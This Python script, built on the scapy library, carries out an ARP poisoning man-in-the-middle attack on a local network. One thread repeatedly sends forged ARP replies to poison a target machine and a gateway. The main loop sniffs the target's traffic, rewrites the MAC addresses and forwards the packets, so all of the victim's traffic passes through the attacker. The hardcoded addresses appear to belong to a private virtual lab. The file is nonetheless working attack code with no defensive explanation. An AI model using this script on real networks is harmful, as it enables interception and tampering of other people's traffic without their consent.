from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy import route
from scapy.sendrecv import sendp, send, sniff
import time
import threading
import sys

# TODO: make this as an input
from scapy.utils import wrpcap

tgt_ip = "192.168.56.101"
ipM2 = "192.168.56.102"
my_ip = "192.168.56.103"
gw_ip = ipM2 #conf.route.route("0.0.0.0")[2]
packet_count = 1


def restore_network(gateway_ip, target_ip):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=getmacbyip(target_ip), psrc=target_ip),
         verbose=False,
         count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=getmacbyip(gateway_ip), psrc=gateway_ip),
         verbose=False,
         count=5)


def arp_poison(gateway_ip, target_ip):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        gateway_mac = getmacbyip(gateway_ip)
        target_mac = getmacbyip(target_ip)
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, target_ip)


# ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gw_ip, tgt_ip))
poison_thread.start()

# Sniff traffic and write to file. Capture is filtered on target machine
try:
    sniff_filter = "ip host " + tgt_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    while True:
        packets = sniff(filter=sniff_filter, iface="enp0s3", count=packet_count)
        #print(f"[*] Captured one packet")
        #print(f"[*] Target mac: {getmacbyip(tgt_ip)}. source mac: {packets[0][Ether].src}")
        if packets[0][Ether].src == getmacbyip(tgt_ip):
            packets[0][Ether].dst = getmacbyip(gw_ip)
        else:
            packets[0][Ether].dst = getmacbyip(tgt_ip)
        packets[0][Ether].src = get_if_hwaddr("enp0s3")
        #print(f"[*] Modified one packet: dst: {packets[0][Ether].dst} and src: {packets[0][Ether].src }")
        sendp(packets, iface="enp0s3", verbose=False)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gw_ip, tgt_ip)
